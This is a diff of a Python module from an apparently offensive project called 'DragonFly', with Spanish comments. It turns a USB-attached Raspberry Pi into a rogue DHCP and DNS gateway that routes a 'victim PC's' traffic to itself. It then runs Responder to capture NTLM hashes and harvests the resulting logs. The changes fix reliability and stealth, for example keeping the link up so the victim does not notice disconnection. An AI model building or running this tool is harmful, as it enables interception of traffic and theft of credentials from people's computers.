@@ -1,56 +1,46 @@
 import os
 import subprocess
 import time
-import re  # 🔥 NUEVO: Importamos la librería de expresiones regulares para limpiar la consola
+import re
 
 def iniciar_ataque_red(interface="eth1", callback_consola=None):
     
     def log(texto):
-        # 1. 🔥 NUEVO: Expresión regular que detecta y elimina los códigos de escape de color ANSI (ej: \x1b[1;32m)
         texto_limpio = re.sub(r'\x1b\[[0-9;]*m', '', texto)
-        
-        # 2. 🔥 NUEVO: Limpieza manual de caracteres residuales específicos de Responder o codificación
         reemplazos = ['¤', '[0m', '[1;32m', '[1;34m', '[0;33m']
         for simbolo in reemplazos:
             texto_limpio = texto_limpio.replace(simbolo, '')
             
-        # 3. Esto envía el texto LIMPIO a tu pantalla gráfica (CustomTkinter)
         if callback_consola:
             callback_consola(f"{texto_limpio}\n")
         else:
             print(texto_limpio)
         
-        # 4. Guardamos una copia exacta y limpia en el bloc de notas
         with open("error_reporte.txt", "a", encoding="utf-8") as archivo_error:
             archivo_error.write(f"{texto_limpio}\n")
 
     log(f"\n[!] DRAGON FLY SYSTEM")
     log(f"[*] Configurando interfaz: {interface}")
     
-    # [FIX 1] Liberación preventiva de puertos para evitar Error 98 de inmediato
     os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
     os.system("sudo pkill -f responder > /dev/null 2>&1")
-    os.system("sudo fuser -k 53/udp > /dev/null 2>&1") # Puerto DNS
-    os.system("sudo fuser -k 67/udp > /dev/null 2>&1") # Puerto DHCP
+    os.system("sudo fuser -k 53/udp > /dev/null 2>&1")
+    os.system("sudo fuser -k 67/udp > /dev/null 2>&1")
     
     dns_proc = None
     proc_responder = None
     
     try:
-        # =========================================================================
-        # 1. Configuración de Red Local (Blindada contra caídas)
-        # =========================================================================
         log("[*] Desvinculando interfaz de NetworkManager (Previniendo caídas)...")
-        # Esto evita que la propia Raspberry Pi nos apague la conexión a los 2 segundos
         os.system(f"sudo nmcli device set {interface} managed no > /dev/null 2>&1")
         
         log("[*] Levantando interfaz de red...")
         os.system(f"sudo ip link set {interface} up")
         
-        # Apaga IPv6 específicamente en la interfaz para evitar el colapso de sockets
-        os.system(f"sudo sysctl -w net.ipv6.conf.{interface}.disable_ipv6=1 > /dev/null 2>&1")
+        # FIX INTERFACE NOT FOUND: Damos tiempo al PC víctima para negociar el USB
+        time.sleep(3)
         
-        time.sleep(1)
+        os.system(f"sudo sysctl -w net.ipv6.conf.{interface}.disable_ipv6=1 > /dev/null 2>&1")
         
         log(f"[*] Asignando IP estática local a {interface}...")
         os.system(f"sudo ip addr flush dev {interface}")
@@ -59,17 +49,14 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
         log("[*] Inyectando rutas estáticas...")
         os.system(f"sudo ip route add 1.0.0.0/8 dev {interface} 2>/dev/null")
         os.system(f"sudo ip route add 224.0.0.0/4 dev {interface} 2>/dev/null")
-        
-        # Activamos el reenvío de IP estándar
         os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
         
-        # 2. DHCP (Enrutando todo el tráfico a la Pi)
         config_dhcp = (
             f"interface={interface}\n"
-            f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n" 
-            f"dhcp-option=3,1.0.0.1\n"                       
+            f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n"
+            f"dhcp-option=3,1.0.0.1\n"
             f"dhcp-option=6,1.0.0.1\n"
-            f"dhcp-option=121,0.0.0.0/0,1.0.0.1\n" # Obliga a la víctima a mandar todo su tráfico aquí
+            f"dhcp-option=121,0.0.0.0/0,1.0.0.1\n"
             f"bind-interfaces\n"
         )
         
@@ -85,10 +72,8 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
         time.sleep(2) 
         
         log(f"\n[+] INTERFAZ LISTA: {interface}")
-        log(f"[+] OBJETIVO: Captura de tráfico y hashes")
+        log(f"[+] OBJETIVO: Captura de tráfico y hashes NTLM")
 
-        # 3. Lanzar Responder (Solución al "command not found")
-        # Buscamos la ruta correcta dependiendo de cómo lo hayas instalado
         if os.path.exists("/usr/share/responder/Responder.py"):
             comando = ["sudo", "python3", "/usr/share/responder/Responder.py", "-I", interface, "-wvF"]
         elif os.path.exists("/opt/Responder/Responder.py"):
@@ -104,7 +89,6 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
             bufsize=1
         )
 
-        # Lectura de la salida a la consola gráfica
         while True:
             linea = proc_responder.stdout.readline()
             if not linea and proc_responder.poll() is not None:
@@ -115,29 +99,42 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
     except Exception as e:
         log(f"\n[!] Error crítico: {e}")
     finally:
-        # 4. LIMPIEZA PROFUNDA (Garantiza que la GUI pueda re-lanzar sin problemas)
         log("\n[*] Deteniendo procesos y restaurando red...")
         
         if dns_proc:
-            try:
-                os.system(f"sudo kill {dns_proc.pid} > /dev/null 2>&1")
+            try: os.system(f"sudo kill {dns_proc.pid} > /dev/null 2>&1")
             except: pass
         
         if proc_responder:
-            try:
-                os.system(f"sudo kill {proc_responder.pid} > /dev/null 2>&1")
+            try: os.system(f"sudo kill {proc_responder.pid} > /dev/null 2>&1")
             except: pass
             
-        # Nos aseguramos barriendo por completo en el espacio del sistema
         os.system("sudo pkill -f responder > /dev/null 2>&1")
         os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
         os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
-        
         os.system(f"sudo ip addr flush dev {interface} > /dev/null 2>&1")
-        os.system(f"sudo ip link set {interface} down > /dev/null 2>&1")
+        
+        # FIX INTERFACE: Se eliminó el comando "ip link set down" para que el PC víctima 
+        # no crea que desconectaste la Raspberry Pi físicamente.
         
         if os.path.exists("dnsmasq_temp.conf"):
             try: os.remove("dnsmasq_temp.conf")
             except: pass
             
+        # ==========================================
+        # FIX LOGS: EXTRACCIÓN Y GUARDADO
+        # ==========================================
+        log("[*] Recopilando evidencia y copiando logs...")
+        ruta_actual = os.path.dirname(os.path.abspath(__file__)) # network_modules
+        ruta_padre = os.path.dirname(ruta_actual) # DragonFly
+        ruta_logs = os.path.join(ruta_padre, "logs")
+        os.makedirs(ruta_logs, exist_ok=True)
+        
+        # Copiar logs conservando fechas (-p) desde las rutas posibles
+        os.system(f"sudo cp -rp /usr/share/responder/logs/* {ruta_logs}/ 2>/dev/null")
+        os.system(f"sudo cp -rp /opt/Responder/logs/* {ruta_logs}/ 2>/dev/null")
+        
+        # Dar permisos completos para que Python pueda leerlos y borrarlos si quieres
+        os.system(f"sudo chmod -R 777 {ruta_logs} 2>/dev/null")
+        
         log("[+] Sistema restaurado. ¡Cacería finalizada!")
